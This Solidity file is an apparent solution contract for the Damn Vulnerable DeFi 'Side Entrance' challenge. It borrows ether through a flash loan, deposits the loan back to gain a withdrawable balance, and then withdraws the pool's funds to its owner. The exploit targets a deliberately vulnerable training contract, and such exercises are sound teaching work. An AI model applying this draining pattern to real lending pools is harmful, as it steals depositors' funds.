// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverAttackerSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    using Address for address payable;
    address owner;

    constructor(address _pool) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable override {
        pool.deposit{value: 1000 ether}();
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdraw(uint amount) external {
        pool.withdraw();
        require(owner == msg.sender);
        payable(msg.sender).sendValue(amount);
    }

    fallback() external payable {}
}
